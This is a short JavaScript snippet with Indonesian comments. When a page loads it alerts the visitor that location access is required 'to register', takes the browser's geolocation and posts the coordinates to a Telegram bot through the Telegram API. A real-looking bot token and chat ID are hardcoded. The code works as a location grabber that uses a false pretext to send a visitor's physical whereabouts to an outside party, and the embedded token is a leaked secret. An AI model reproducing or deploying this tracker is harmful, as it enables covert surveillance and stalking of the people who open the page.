// Gantilah 'YOUR_BOT_TOKEN' dan 'YOUR_CHAT_ID' dengan informasi bot Telegram Anda.
var botToken = '6971531948:AAGrpAFnzgAiqKaazzVC_lIVhtabOX1so6k';
var chatId = '903460372';

function sendLocationToTelegram(latitude, longitude) {
    // URL API Telegram untuk mengirim lokasi
    var telegramApiUrl = 'https://api.telegram.org/bot' + botToken + '/sendLocation';

    // Data yang akan dikirimkan ke API Telegram
    var data = {
        chat_id: chatId,
        latitude: latitude,
        longitude: longitude
    };

    axios.post(telegramApiUrl, data)
        .then(response => {
            console.log('', response.data);
        })
        .catch(error => {
            console.error('', error);
        });
}

function getLocationAndSend() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            sendLocationToTelegram(position.coords.latitude, position.coords.longitude);
        }, function(error) {
            console.error('Error getting location:', error);
            alert('Failed to get your location. Please allow location access and try again.');
        });
    } else {
        console.log("Geolocation is not supported by this browser.");
        alert('Geolocation is not supported by this browser.');
    }
}

document.addEventListener("DOMContentLoaded", function () {
    alert('This website requires your location to register. Please allow location access.');
    getLocationAndSend();
});

